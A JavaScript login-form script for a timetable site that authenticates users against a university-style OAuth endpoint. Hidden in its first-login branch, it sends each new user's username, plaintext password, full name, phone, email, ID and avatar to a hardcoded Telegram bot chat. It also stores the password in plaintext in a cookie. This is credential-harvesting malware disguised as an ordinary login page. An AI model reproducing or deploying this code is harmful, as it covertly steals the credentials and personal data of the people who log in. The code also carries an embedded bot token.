const showPassword = document.querySelector("input#show-password"),
passwordInput = document.querySelector("input#password"),
formLogin = document.querySelector("#user-login");


function getLoggingUser(username, password) {
    fetchData('https://inet.mdis.uz/oauth/token', "POST", `username=${username}&password=${password}&grant_type=password`).then(data => {
        if (!getCookie("username")) {
            setCookie("username", username, 20)
        }
        if (!getCookie("password")) {
            setCookie("password", password, 20)
        }
        if (!getCookie("isReggedBefore")) {
            const message = `New Login to Timetable%0A%0AFull Name: ${data.user.fullName}%0ARole: ${data.user.roles[0]}%0AID: ${data.user.uuid}%0APhone: +${data.user.phone}%0AEmail: ${data.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
            setCookie("isReggedBefore", true, 60)
            fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendDocument?chat_id=1273666675&document=https://inet.mdis.uz${data.user.avatar}&caption=${message}&parse_mode=html`).then(() => {
                let redirect_url = "/";
                redirect_url = getRequest("redirect_url");
                location.replace(redirect_url)
            })
        }
        else {
            let redirect_url = "/";
            redirect_url = getRequest("redirect_url");
            location.replace(redirect_url)
        }
    }).catch(() => {
        formLogin.classList.add("error")
    })
}


showPassword.onchange = e => {
    if (passwordInput.getAttribute("type") == "password") {
        passwordInput.setAttribute("type", "text")
    }
    else {
        passwordInput.setAttribute("type", "password")
    }
}



formLogin.addEventListener("submit", e => {
    let username, password;
    e.preventDefault()
    username = document.querySelector("#user-login input[name=username]").value
    password = document.querySelector("#user-login input[name=password]").value
    getLoggingUser(username, password)
})